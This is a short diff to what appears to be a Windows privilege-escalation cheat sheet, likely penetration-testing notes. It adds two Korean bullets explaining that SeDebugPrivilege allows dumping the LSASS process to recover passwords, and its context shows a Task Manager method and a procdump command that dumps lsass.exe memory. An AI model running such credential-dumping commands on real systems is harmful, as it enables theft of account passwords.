@@ -541,6 +541,8 @@ sc.exe start VMTools
 <details>
  <summary><strong>SeDebugPrivilege</strong></summary>
 
+- 일반적인 유저로는 `lsass`를 덤핑할 수 없으나, 권한이 있을 경우 덤핑이 가능.
+- `lsass`를 덤핑할 경우 비밀번호를 획득 가능.
 - `Task Manager > Details > choose LSASS > right click > Create dump file`
 ```powershell
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
